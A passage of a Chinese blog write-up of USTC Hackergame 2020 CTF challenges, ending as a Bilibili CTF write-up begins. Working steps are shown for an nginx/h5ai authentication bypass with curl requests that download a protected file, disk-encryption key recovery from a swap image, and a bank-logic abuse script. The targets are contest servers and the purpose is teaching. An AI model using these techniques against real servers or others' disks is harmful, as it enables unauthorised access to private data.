class=\"hljs-string\">'ascii'</span>)    <span class=\"hljs-keyword\">try</span>:        <span class=\"hljs-keyword\">return</span> barcode.raw    <span class=\"hljs-keyword\">except</span>:        <span class=\"hljs-built_in\">print</span>(img_path, barcode)        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">\"\"</span><span class=\"hljs-function\"><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title\">listDirImages</span>(<span class=\"hljs-params\">folder</span>):</span>    imgs = []    <span class=\"hljs-keyword\">for</span> img_path <span class=\"hljs-keyword\">in</span> os.listdir(folder):        ext = os.path.splitext(img_path)        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(ext) &gt; <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> ext[<span class=\"hljs-number\">1</span>].lower() == <span class=\"hljs-string\">\".png\"</span>:            imgs.append(img_path)    imgs.sort()    <span class=\"hljs-keyword\">return</span> imgscontents = []<span class=\"hljs-keyword\">for</span> img <span class=\"hljs-keyword\">in</span> listDirImages(<span class=\"hljs-string\">\"./\"</span>):    contents.extend(parseQRCode(img))file = <span class=\"hljs-string\">\"./result.txt\"</span><span class=\"hljs-keyword\">with</span> <span class=\"hljs-built_in\">open</span>(file, <span class=\"hljs-string\">\"w\"</span>) <span class=\"hljs-keyword\">as</span> f:    <span class=\"hljs-keyword\">for</span> c <span class=\"hljs-keyword\">in</span> contents:        f.write(c)</code></pre>\n<blockquote><p>这道题对二维码解码库的选择非常关键。<code>zybar</code> 已经八年没有更新，不仅无法处理 Binary Format QRCode、而且还无法识别 00 截断；相比来说，<code>zxing</code> 库的维护非常活跃、因而更为可靠。不过即使使用 py-zxing 也有坑，很快就会看到了。</p></blockquote>\n<p>把脚本丢到二维码目录下执行，跑完了打开 <code>result.txt</code>，看到了 <code>META</code>（一个 <code>openlug/django-common</code> 的 GitHub RESTful API 返回值）、<code>COMMITS</code>，甚至还看到了一条 commit message「There’s no flag in META and COMMITS!」。但是到了 <code>repo.tar.xz</code> 却让我伤破脑筋：zlib 的文件头本应该是 <code>FD 37 7A 58</code>，结果却看到了 <code>EF BF BD 37 7A 58</code>，解压软件一个都认不出来。</p>\n<p>这是啥玩意？遇事不决问 Google，结果找到了这个：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/20.png\" width=\"829\" height=\"601\" class=\"lazy post-img\"></p>\n<blockquote><p>[狐狐脏话删除]</p></blockquote>\n<p>接下来就是去魔改 zxing 了。如之前所说，python-zxing 还只是个 Java zxing 的 wrapper，不得不去学了一点 Java 把 zxing 里的 UTF-8 干掉，最终重新解析了一遍二维码、拿到了正确的 <code>repo.tar.xz</code>，解压拿到了 flag。</p>\n<blockquote><p>顺便说一句，做完这道题后有点无聊，开始通过 META 反推原始仓库。原本看到 <code>openlug/nonexist</code>，以为出题人是新建了一个 Private Repo 出的题，但是又看到 <code>fork_count</code> 和 <code>network_count</code> 是 5，所以得出结论这肯定是一个 Public Repo（否则不可能有 Fork）。再根据 Star 数在 30 左右、Watch 数（在 GitHub RESTful API 中通过 <code>subscriber_count</code> 呈现）是 1、语言是 Python， 最后反推出 META 信息源自去年「被泄露的姜戈」的 <code>openlug/django-common</code>，生成 META 的方式就是 <code>curl https://api.github.com/repos/openlug/django-common</code>。结果还被组委会 diss 了，大尾巴狐狐非常不高兴。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.0/32.png\" width=\"1067\" height=\"247\" class=\"lazy post-img\"></p>\n<h2>狗狗银行</h2>\n<blockquote><p>你能在狗狗银行成功薅到羊毛吗？</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/6.png\" width=\"1009\" height=\"593\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/7.png\" width=\"988\" height=\"581\" class=\"lazy post-img\"></p>\n<p>考虑到题目公告更新提示「本题前端计算存在浮点数导致的计算误差，数字特别极端时显示可能不正确。但后端采用大整数精确计算，只有净资产确实高于 2000 时才会给出 flag」，所以这道题的思路和 前年 USTC Hackergame 2018 的猫咪银行借助 INT64 溢出 肯定是不一样的。</p>\n<p>首先观察题目给出的条件：每天都要花 10 块钱吃饭；信用卡利率 0.5%、并且一旦欠款每天利息至少是 10 块钱；储蓄卡利率 0.3%。光从字面上的数字来看似乎这道题做不出来，但是我们知道，阿里蚂蚁金服的「余额宝」产品存在「每天收益不足 1 分钱时按 1 分钱计算」的规则。狗狗银行的储蓄卡利率是否也有类似的规则呢？办一张新的「储蓄卡 3」，从「储蓄卡 1」转 166 块钱到「储蓄卡 3」，「储蓄卡 3」的日利息仍然是 0；再从「储蓄卡 1」转 1 块钱到「储蓄卡 3」使余额变成 167 块，Bingo！现在「储蓄卡 3」的日利息有 1 块钱了。<code>1 / 167</code> 算出来真实的日利率是 0.5988%，比信用卡的利率要高 0.0988%，因此我们可以从信用卡借钱然后赚利息的差价，当然还要考虑到每天至少要净赚 10 块的饭钱、以及信用卡的复利（利滚利）。</p>\n<p>接下来就是用脚本连续开一万张卡试图一天拿到 flag，然后，三台备用服务器（一个 IP 上三个端口、三个 Docker）全部 RST 了。。。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/13.png\" width=\"782\" height=\"905\" class=\"lazy post-img\"></p>\n<p>之后，题目新增了一条公告：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/15.png\" width=\"690\" height=\"94\" class=\"lazy post-img\"></p>\n<p>苏卡卡才不是故意的呢（摇尾巴），<del>苏卡卡只是坏，一天赚 1000 不香嘛</del>；虽然有了 1000 张卡的限制，获取 flag 还是轻而易举的：</p>\n<pre><code class=\"hljs js\">(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> commonFetchOpt = {    <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>, <span class=\"hljs-attr\">mode</span>: <span class=\"hljs-string\">'cors'</span>, <span class=\"hljs-attr\">credentials</span>: <span class=\"hljs-string\">'include'</span>,    <span class=\"hljs-attr\">headers</span>: {      <span class=\"hljs-attr\">Authorization</span>: <span class=\"hljs-string\">'Bearer [选手 Token]'</span>,      <span class=\"hljs-string\">'Content-Type'</span>: <span class=\"hljs-string\">'application/json; charset=utf-8'</span>    }  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{'credit'|'debit'}</span> <span class=\"hljs-variable\">type</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">createCard</span>(<span class=\"hljs-params\">type = <span class=\"hljs-string\">'debit'</span></span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/create'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ type }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">from</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">to</span></span></span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">amount</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">transfer</span>(<span class=\"hljs-params\"><span class=\"hljs-keyword\">from</span>, to, amount</span>) </span>{    <span class=\"hljs-keyword\">return</span> fetch(<span class=\"hljs-string\">'/api/transfer'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ amount, <span class=\"hljs-attr\">dst</span>: to, <span class=\"hljs-attr\">src</span>: <span class=\"hljs-keyword\">from</span> }),      ...commonFetchOpt    });  }  <span class=\"hljs-comment\">/**</span><span class=\"hljs-comment\">   * <span class=\"hljs-doctag\">@param <span class=\"hljs-type\">{Number}</span> <span class=\"hljs-variable\">account</span></span></span><span class=\"hljs-comment\">   */</span>  <span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">eatAndEndTheDay</span>(<span class=\"hljs-params\">account</span>) </span>{    <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/eat'</span>, {      <span class=\"hljs-attr\">body</span>: <span class=\"hljs-built_in\">JSON</span>.stringify({ account }),      ...commonFetchOpt    });  }  <span class=\"hljs-keyword\">try</span> {    <span class=\"hljs-comment\">// 开一张信用卡</span>    <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'credit'</span>);    <span class=\"hljs-comment\">// 开 999 张储蓄卡，并给每张新开的储蓄卡转 167 块钱</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">3</span>; i &lt; <span class=\"hljs-number\">1002</span>; i++) {      <span class=\"hljs-keyword\">await</span> createCard(<span class=\"hljs-string\">'debit'</span>);      <span class=\"hljs-keyword\">await</span> transfer(<span class=\"hljs-number\">2</span>, i, <span class=\"hljs-number\">167</span>);    }    <span class=\"hljs-comment\">// 用储蓄卡 1 的初始资金 1000 度过 14 天</span>    <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &lt; <span class=\"hljs-number\">14</span>; i++) {      <span class=\"hljs-keyword\">await</span> eatAndEndTheDay(<span class=\"hljs-number\">1</span>);    }    <span class=\"hljs-comment\">// 14 天肯定能赚够 1000 块钱了，该获取 flag 了</span>    <span class=\"hljs-keyword\">const</span> req = <span class=\"hljs-keyword\">await</span> fetch(<span class=\"hljs-string\">'/api/user'</span>, { ...commonFetchOpt, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> });    <span class=\"hljs-keyword\">const</span> resp = <span class=\"hljs-keyword\">await</span> req.json();    <span class=\"hljs-built_in\">console</span>.log(resp.flag);  } <span class=\"hljs-keyword\">catch</span> (e) {    <span class=\"hljs-built_in\">console</span>.error(e);  }})();</code></pre>\n<h2>超基础的数理模拟器</h2>\n<blockquote><p>……<br>我们在 Hackergame 2020 的网站上部署了一项超基础的数理模拟器。 作为一名数理基础扎实的同学，你一定能够轻松通过模拟器的测试吧。</p></blockquote>\n<p>打开题目后发现要做 400 道定积分，而且答案还要取小数点后六位：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.8/29.png\" width=\"1497\" height=\"412\" class=\"lazy post-img\"></p>\n<p>这道题没有取巧的办法，只有老老实实把 400 道定积分全部做完…..吧？</p>\n<p>这么长的定积分谁手算啊，当然是要用 MatLab 来算啦！徒手转换 LaTex 到 MathLab 太麻烦了，写个脚本来做吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/27.png\" width=\"1150\" height=\"420\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/28.png\" width=\"1146\" height=\"539\" class=\"lazy post-img\"></p>\n<p>UserScript 在 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-js\">这里</a>，好孩子千万不要学习这种方法来解析 LaTex。</p>\n<h2>室友的加密硬盘</h2>\n<blockquote>\n<p>「我的家目录是 512 位 AES 加密的，就算电脑给别人我的秘密也不会泄漏……」你的室友在借你看他装着 Linux 的新电脑时这么说道。你不信，于是偷偷从 U 盘启动，拷出了他硬盘的一部分内容。</p>\n<p><a href=\"https://archive.org/details/roommates_disk_part.img\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>苏卡卡一开始试图把镜像直接挂载在虚拟机上，结果无法启动系统；于是先起了一个 Linux 虚拟机、在 Linux 下将 img 转换为 vmdk 再添加到虚拟机中，结果依然提示「未找到已安装的操作系统或操作系统安装器」。</p>\n<blockquote><p>中国民航于 1992 年在《中国民用航空局关于确保飞行安全的命令》文件中提出了 54 个字「八该一反对」，其中最重要的就是「反对盲目蛮干」</p></blockquote>\n<p>既然通过 img 文件直接启动没有成功，不如先看看这个 img 文件都有什么：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/18.png\" width=\"824\" height=\"864\" class=\"lazy post-img\"></p>\n<blockquote><p>不要在意这个 Ubuntu Kylin，最近狐狐在虚拟机里各种体验各种「国产 Linux 发行版」，虚拟机里正好有 Ubuntu Kylin 所以拿来用的。</p></blockquote>\n<p>由于之前阅读过一些通过内存转储破解全盘加密的文章，所以便去下载了 <a href=\"https://sourceforge.net/projects/findaes/\">findaes</a> 的源码，编译的同时再去重读之前的几篇文章获取思路。看到几篇文章中都是用 findaes 直接读取 raw 的内存转储，于是决定直接用 findaes 爆破硬盘映像文件。首先把 img 用 7z 解压出来，然后一个一个分区映像跑：</p>\n<pre><code class=\"hljs bash\">$ ./findaes /path/to/img1.raw</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.7/19.jpg\" width=\"867\" height=\"480\" class=\"lazy post-img\"></p>\n<p>根据题干「我的家目录是 512 位 AES 加密的」，但是 findaes 找到的都是 AES-256，所以需要从中筛选出一对 offset 相差为 256bit 的 key 进行拼接，因此还需要注意一点，由于 Intel x86_64 的 little-endian、拼接 key 时需要倒序拼接。</p>\n<blockquote><p>其实这一点我还是比较熟悉的，安装 Hackintosh 时注入十六进制的设备属性时需要互换 bit 也是因为 little-endian。</p></blockquote>\n<p>剩下的就是一对一对 key 的用 <code>sudo cryptsetup luksAddKey --master-key-file</code> 试过去，直到成功解密为止。最后用 swap 里的最后一对 key 成功解密了分区并拿到了 flag <code>flag{lets_do_A_c01d_b00t_next_time}</code> （下次试试冷启动吧！），直到看到 flag 才明白本题的思路是 Linux 休眠后会把内存写入 swap 分区中（macOS 则是写入硬盘上的 <code>sleepimage</code> 文件中），因此和之前读过的从内存转储破解全盘加密的思路是完全一致的。最后再给大家推荐 Red Hat 知识库的一篇文章「<a href=\"https://access.redhat.com/solutions/1543373\">How to recover lost LUKS key or passphrase</a>」。</p>\n<h2>超简易的网盘服务器</h2>\n<blockquote>\n<p>…… 小 C 开始思考技术方案：“听说 h5ai 搭建云盘的方案是不错的 … 使用 Basic Auth 可以做访问控制，可以保护<a href=\"http://202.38.93.111:10120/\">根目录</a>下的文件不被非法的访问 … 等等，有一些文件是可以被分享的，需要一个 <a href=\"http://202.38.93.111:10120/Public\">/Public</a> 目录来共享文件！”</p>\n<p>三分钟后，小 C 同学完成了网盘的搭建。他想：“空着总不好，先得在云盘上放点东西！”。犹豫片刻，他掏出了自己珍藏了三个月的 flag 并上传到了云盘的<a href=\"http://202.38.93.111:10120/\">根目录</a>。</p>\n</blockquote>\n<p>这道题我好像是第五个还是第六个解出来的。这道题很多人没做出来还是有点令我惊讶的。</p>\n<p>直接访问「根目录」会提示 401 需要 HTTP Basic Authentication，聪明的 小 C 肯定不会把密码直接暴露出来的。访问 <code>/Public </code>目录却发现了 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_nginx-conf\"><code>dockerfile</code></a> 和 <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-h5ai_dockerfile\"><code>nginx.conf</code></a> 文件。从 dockerfile 中我们可以知道小 C 是怎么搭建的服务，而 <code>nginx.conf</code> 更值得我们关心（已省去无关紧要的部分）：</p>\n<pre><code class=\"hljs nginx\"><span class=\"hljs-attribute\">index</span> index.php index.html /_h5ai/public/index.php;<span class=\"hljs-comment\"># 根目录是私有目录，使用 basic auth 进行认证，只有我（超极致的小 C)自己可以访问</span><span class=\"hljs-attribute\">location</span> / {    <span class=\"hljs-attribute\">auth_basic</span> <span class=\"hljs-string\">\"easy h5ai. For visitors, please refer to public directory at `/Public!`\"</span>;    <span class=\"hljs-attribute\">auth_basic_user_file</span> /etc/nginx/conf.d/htpasswd;}<span class=\"hljs-comment\"># Public 目录是公开的，任何人都可以访问，便于我给大家分享文件</span><span class=\"hljs-attribute\">location</span> /Public {    <span class=\"hljs-attribute\">allow</span> all;    <span class=\"hljs-attribute\">index</span> /Public/_h5ai/public/index.php;}<span class=\"hljs-comment\"># PHP 的 fastcgi 配置，将请求转发给 php-fpm</span><span class=\"hljs-attribute\">location</span> <span class=\"hljs-regexp\">~ \\.php$</span> {         <span class=\"hljs-attribute\">fastcgi_pass</span>   <span class=\"hljs-number\">127.0.0.1:9000</span>;         <span class=\"hljs-attribute\">fastcgi_index</span>  index.php;         <span class=\"hljs-attribute\">fastcgi_param</span>  SCRIPT_FILENAME  $document_root$fastcgi_script_name;         <span class=\"hljs-attribute\">include</span>        fastcgi_params;}</code></pre>\n<p>由于 Nginx 配置文件不是连续匹配，因此访问 <code>.php</code> 结尾的路径是不会触发 401 HTTP Basic Auth 的（应该没有人会天真地试图获取 <code>/etc/nginx/conf.d/htpassword</code> 吧？）。既然如此，我们为什么不直接访问 <code>h5ai</code> 的 <code>index.php</code> 呢？首先让我们请求一下 <code>/Public</code> 目录下的 h5ai 后台页面 <code>/Public/_h5ai/public/index.php</code>：</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/Public/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>那么「根目录」下的 <code>/_h5ai/public/index.php</code> 呢？</p>\n<pre><code class=\"hljs bash\">curl http://202.38.93.111:10120/_h5ai/public/index.php -IHTTP/1.1 200 OK</code></pre>\n<p>不出所料，直接访问 <code>index.php</code> 也会返回 200 OK，而不是 401。</p>\n<p>虽然直接访问 <code>/_h5ai/public/index.php</code> 不会返回 401，但是 GET 这个路径默认是返回 h5ai 的后台调试页面。由于 h5ai 是开源的、我们可以前往 <a href=\"https://github.com/lrsjng/h5ai\">h5ai 的 GitHub</a> 对其代码进行审计，发现 <a href=\"https://github.com/lrsjng/h5ai/blob/master/src/_h5ai/private/php/core/class-api.php\">h5ai 提供了一系列 API</a>，可以通过 POST 请求列出目录内容和下载文件。首先试试能不能用 API 列出根目录下的文件内容：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/json;charset=UTF-8'</span> --data-binary <span class=\"hljs-string\">'{\"action\":\"get\",\"items\":{\"href\":\"/\",\"what\":1}}'</span> | jq{  <span class=\"hljs-string\">\"items\"</span>: [    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986831000,      <span class=\"hljs-string\">\"size\"</span>: 789419,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">true</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">true</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/Public/\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603986830000,      <span class=\"hljs-string\">\"size\"</span>: 396458,      <span class=\"hljs-string\">\"managed\"</span>: <span class=\"hljs-literal\">false</span>,      <span class=\"hljs-string\">\"fetched\"</span>: <span class=\"hljs-literal\">false</span>    },    {      <span class=\"hljs-string\">\"href\"</span>: <span class=\"hljs-string\">\"/flag.txt\"</span>,      <span class=\"hljs-string\">\"time\"</span>: 1603489315000,      <span class=\"hljs-string\">\"size\"</span>: 24    }  ]}</code></pre>\n<p>诶嘿嘿，我们看到 <code>/flag.txt</code> 啦！接下来就是用 API 下载 <code>flag.txt</code> 文件了：</p>\n<pre><code class=\"hljs bash\">$ curl <span class=\"hljs-string\">'http://202.38.93.111:10120/_h5ai/public/index.php'</span> -H <span class=\"hljs-string\">'Content-Type: application/x-www-form-urlencoded'</span> --data-raw <span class=\"hljs-string\">'action=download&amp;as=flag.txt.tar&amp;type=php-tar&amp;baseHref=/&amp;hrefs[0]=/flag.txt'</span> -o flag.txt.tar$ tar xzf flag.txt.tar$ cat flag.txt <span class=\"hljs-comment\"># Flag 到手啦</span></code></pre>\n<h2>超安全的代理服务器</h2>\n<blockquote>\n<p>在 2039 年，爆发了一场史无前例的疫情。为了便于在各地的同学访问某知名大学「裤子大」的网站进行「每日健康打卡」，小 C 同学为大家提供了这样一个代理服务。曾经信息安全专业出身的小 C 决定把这个代理设计成最安全的代理。</p>\n<p><strong>提示：浏览器可能会提示该 TLS 证书无效，与本题解法无关，信任即可。</strong></p>\n</blockquote>\n<p>「浏览器可能会提示该 TLS 证书无效」这句话至关重要。想想看为什么别的题都是通过 HTTP 访问的、唯独这道题要用 HTTPS？什么东西需要 HTTPS 才能工作、在 HTTP 下不工作呢？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/9.png\" width=\"1165\" height=\"294\" class=\"lazy post-img\"></p>\n<p>虽然 HTTP/2 本身不要求 TLS 实现（例如 H2C、HTTP/2 ClearText）、并且有通过 HTTP/1.1 升级到 HTTP/2 的协商方法（参见 <a href=\"https://blog.skk.moe/post/http3-alt-svc/#HTTP-2-%E7%9A%84%E5%8D%8F%E5%95%86%E6%96%B9%E5%BC%8F\">我之前的文章「HTTP/3：HTTP Alternative Services 作为协商方式」中的「HTTP/2 的协商方式」章节</a> ），但是所有支持 HTTP/2 的浏览器都要求 HTTP/2 必须通过 TLS 传输、并在 Client Hello 中通过 ALPN Protocol 进行协商。扯远了，看看题目。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/8.png\" width=\"750\" height=\"400\" class=\"lazy post-img\"></p>\n<p>「我们已经向您 <strong>推送（PUSH）</strong> 了最新的 <strong>Secret</strong> ，但是你可能无法直接看到它」。现在我们知道了，这道题和 HTTP/2 Server Push 有关。解码 HTTP/2 帧最好的方法自然是使用 Wireshark。首先我们要让 Wireshark 能够解密 HTTPS 内容，最简单的方法是使用 <code>SSLKEYLOGFILE</code> 环境变量。</p>\n<blockquote><p>警告！使用 <code>SSLKEYLOGFILE</code> 环境变量非常危险，任何获取该变量的软件都可以随意解密你的 HTTPS 流量！因此，务必仅针对某一需要解密流量的软件、在某一次性 Session 下设置该环境变量！</p></blockquote>\n<p>打开 Chrome，在 <code>chrome://version/</code> 中查看可执行文件路径：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/10.png\" width=\"1196\" height=\"270\" class=\"lazy post-img\"></p>\n<p>然后在终端中通过预设环境变量直接启动 Chrome：</p>\n<pre><code class=\"hljs bash\">SSLKEYLOGFILE=<span class=\"hljs-string\">\"/path/to/ssllog.txt\"</span> <span class=\"hljs-string\">\"/Applications/Google Chrome.app/Contents/MacOS/Google Chrome\"</span></code></pre>\n<p>启动 Wireshark 偏好设置中找到 Protocol - TLS、配置 (Pre)-Master-Secret log filename：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/11.png\" width=\"687\" height=\"514\" class=\"lazy post-img\"></p>\n<p>现在，再通过启动的 Chrome 访问「Smart Proxy!」，可以看到 Wireshark 完整解密了 Chrome 的所有 HTTPS 流量。在 Wireshark 中使用下述过滤器找出本题的流量：</p>\n<pre><code class=\"hljs plaintext\">ip.addr == 146.56.228.227</code></pre>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/12.png\" width=\"1371\" height=\"279\" class=\"lazy post-img\"></p>\n<p>在过滤后的流量中我们很快就可以找到 PUSH_PROMISE 帧、告诉了我们如何获得 secret 和第一个 flag：<code>GET /ebe087a0-68e5-4280-b605-b98b89488e1e</code>。</p>\n<p>获得第一个 flag 后，我们可以在终端中 Ctrl + C 关闭 Chrome。之后从 Dock、桌面、Finder、Spotlight 等方法「正常启动」Chrome 是不会再将 TLS 握手的信息输出到 SSLKEYLOGFILE 的。</p>\n<h2>尾声</h2>\n<p>今年的 USTC Hackergame 对我来说运气的成分远高于能力的成分，不少题目都是侥幸做出来的，而且对 <code>binary</code> 和 <code>math</code> 一窍不通的我这两类题几乎一道题都没做出来；比赛期间甚至收到了主办方邀请提交「非官方题解」，受宠若惊（狐狐暗自高兴）；最后拿到了 3250 分，排名侥幸挤进了前 50、与真正的 CS 大佬和 CTF 师傅们在榜上合影，瑟瑟发抖（非常害怕）。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.9/31.png\" width=\"1109\" height=\"135\" class=\"lazy post-img\"></p>\n<p>没有对比就没有伤害，相比 <a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">两周前 Bilibili 的「1024  程序员节 CTF」</a>，USTC Hackergame 不论是在难度梯度分布、题目水平、趣味性、活动整体质量上都远高一个层次。引用组委会成员「Zihan Zheng」在知乎「<a href=\"https://www.zhihu.com/question/351947330/answer/866177844\">参加中国科学技术大学第六届信息安全大赛（Hackergame 2019）是怎样一种体验？</a>」提问中的回答：</p>\n<blockquote><p>我们举办的 Hackergame 的初衷就是对新人友好，增加趣味性，强调教育意义。我看到有些同学反馈说题目偏简单、逆向题偏少等等，我想强调，我们这个比赛虽然是提交 flag 的形式，但<strong>不是 CTF 比赛，不会与国内外的 CTF 比赛对标</strong>。我们会把这个特色坚持下去，希望大家不要从经验丰富的 CTF 选手视角来评价我们的比赛。</p></blockquote>\n<p>如果说 Hackergame 的初衷是「对新人友好，增加趣味性，强调教育意义」，IMHO 不论是 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">往届</a> 还是今年的比赛都完美达成了这一点；毫无疑问地，明年的比赛我依然会参加。最后当然是要在「尾声」中喊一句口号：</p>\n<blockquote><p>「我有一个绝妙的解法，可惜我号太少，说不出来」</p></blockquote>\n<div class=\"license\"> <div class=\"license-title\">USTC Hackergame 2020（中科大信安赛）write up</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hackergame-2020-write-up/\">https://blog.skk.moe/post/hackergame-2020-write-up/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-06</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hackergame-2020-write-up/"},{"title":"Bilibili 2020「1024 程序员节」CTF Write Up","date":"2020-10-25 09:44:00","description":"\n<blockquote><p>周六不放假休息，还在这加班搞 CTF？</p></blockquote>\n<p>10 月 24 日不睡觉、凌晨两点钟我还在水群，结果在 USTC@LUG 的群里看见有人在打 Bilibili 的 CTF。我刚刚好一年（指 370 天）没有打过 CTF 了（上一次打正式的 CTF 还是去年参加的 <a href=\"https://blog.skk.moe/post/hackergame-2019-write-up/\">USTC Hackergame 2019</a>），所以想着来玩玩。虽然 CTF 结束之前不应该分享和公开 Write Up 和题解，不过 Bilibili 这 CTF 既然这么离谱，那我也没必要按照常理出牌。</p>\n<span></span><blockquote><p>本文更新于 2020 年 10 月 25 日下午 6 点（China Standard Time）。</p></blockquote>\n<p>由于这次 Bilibili 的 CTF 题实在没有什么存档研究的必要，我的 Write Up 里就留一些代码片段和截图，大家也没有复盘的必要。</p>\n<h2>页面的背后是什么 &amp; 真正的秘密只有特殊的设备才能看到</h2>\n<p>一个页面，两道题。打开来就是这个页面：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/1.png\" width=\"1901\" height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        